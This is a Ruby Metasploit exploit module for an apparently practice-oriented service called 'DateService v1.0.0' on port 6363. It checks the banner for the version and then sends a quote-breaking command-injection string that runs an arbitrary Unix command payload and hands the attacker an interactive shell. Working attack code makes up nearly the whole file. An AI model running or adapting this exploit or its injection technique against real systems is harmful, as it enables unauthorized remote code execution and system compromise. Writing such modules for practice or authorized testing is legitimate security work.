require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  include Msf::Exploit::Remote::Tcp


  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'DateService v1.0.0 Command Injection RCE',
      'Description'    => %q{
        Exploits the CLI vulnerability in DateService version 1.0.0.
        Injects a plain sh shell and lets the attacker interact with it.
      },
      'Author'         => ['Sviatko124'],
      'License'        => MSF_LICENSE,
      'References'     => [
        ['URL', 'http://github.com/Sviatko124/metasploit-practice-module']
      ],
      'Platform'       => 'unix',
      'Arch'           => [ARCH_CMD],
      'Payload'        => {
        'Compat' => {
          'PayloadType' => 'cmd',
          'ConnectionType' => 'find'
        }
      },
      'Targets' => [
        [
          'Unix Command Injection',
          {
            'Platform' => 'unix',
            'Arch' => [ARCH_CMD],
          }
        ]
      ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => '2025-09-23'
    ))

    register_options([
      Opt::RPORT(6363)
    ])
  end

  def exploit
    print_status("Connecting to #{rhost}:#{rport}...")
    connect

    begin
      banner = sock.get_once(4096, 2)
      first_line = banner.split("\n")[0] if banner
      print_status("Received banner: #{first_line}") if first_line
      if first_line && first_line.include?("v1.0.0")
        print_good("Target is vulnerable!")
      else
        print_warning("Target is likely not vulnerable.")
      end
    rescue ::EOFError, ::IOError
    end
    print_status("Payload sent!")

    sock.put("'; #{payload.encoded} #\n")
    print_status("Starting handler...")
    handler
    
  end

end

